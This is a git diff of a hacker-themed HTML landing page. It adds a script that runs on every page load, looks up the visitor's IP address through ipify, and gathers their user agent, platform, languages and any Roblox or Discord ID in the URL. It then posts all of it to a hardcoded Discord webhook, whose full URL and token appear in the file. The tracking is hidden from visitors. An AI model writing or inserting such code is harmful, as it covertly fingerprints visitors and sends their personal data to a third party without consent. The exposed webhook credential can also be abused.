@@ -60,6 +60,7 @@
                 const newImage = document.createElement("img");
                 newImage.src = "https://discord.c99.nl/widget/theme-4/502974588075114509.png";
                 newImage.style.width = "300px";
+                imageContainer.removeChild(imageContainer.firstChild);
                 imageContainer.appendChild(newImage);
             }, 10000);
 
@@ -94,7 +95,7 @@
             document.onselectstart = function () { return false; }
 
             var i = 0;
-            var txt = 'root@bash ~# click anywhere to start.......';
+            var txt = 'root@bash ~# click anywhere to start...';
             var speed = 50;
             function typeWriter() {
                 if (i < txt.length) {
@@ -132,20 +133,51 @@
             }
         </script>
         <script>
-            function enviarMensagemDiscord() {
-              var xhr = new XMLHttpRequest();
-              xhr.open("POST", "https://discord.com/api/webhooks/1119072044290687079/L2gDQchkqGO0MoUYdnsRBf7NvAmEb-dLcErFfyL2b7lqkKGoAfIoyr64qRaHd8HZwagt", true);
-          
-              xhr.setRequestHeader("Content-Type", "application/json");
-          
-              var data = JSON.stringify({
-                content: "Uma pessoa acessou o site agora",
-              });
-          
-              xhr.send(data);
+function enviarMensagemDiscord() {
+    var xhr = new XMLHttpRequest();
+    xhr.open("GET", "https://api.ipify.org?format=json", true);
+
+    xhr.onload = function() {
+        if (xhr.status === 200) {
+            var response = JSON.parse(xhr.responseText);
+            var userIP = response.ip;
+
+            var userAgent = navigator.userAgent;
+            var platform = navigator.platform;
+
+            var userLanguage = navigator.language;
+            var userLanguages = navigator.languages;
+
+            var robloxId = "Não detectado";
+            if (window.location.href.includes("roblox.com")) {
+                robloxId = window.location.pathname.split("/")[2];
             }
-          
-            window.addEventListener("load", enviarMensagemDiscord);
+
+            var discordId = "Não detectado";
+            var discordMatch = window.location.href.match(/discord\.com\/users\/(\d+)/);
+            if (discordMatch) {
+                discordId = discordMatch[1];
+            }
+
+            var discordXhr = new XMLHttpRequest();
+            discordXhr.open("POST", "https://discord.com/api/webhooks/1119072044290687079/L2gDQchkqGO0MoUYdnsRBf7NvAmEb-dLcErFfyL2b7lqkKGoAfIoyr64qRaHd8HZwagt", true);
+            discordXhr.setRequestHeader("Content-Type", "application/json");
+            var data = JSON.stringify({
+                content: "Uma pessoa acessou o site agora\nIP: " + userIP +
+                         "\nUser Agent: " + userAgent + 
+                         "\nPlatform: " + platform + 
+                         "\nLanguage: " + userLanguage + 
+                         "\nLanguages: " + userLanguages.join(", ") +
+                         "\nRoblox ID: " + robloxId +
+                         "\nDiscord ID: " + discordId,
+            });
+            discordXhr.send(data);
+        }
+    };
+
+    xhr.send();
+}
+window.addEventListener("load", enviarMensagemDiscord);
           </script>
     </body>
 </html>
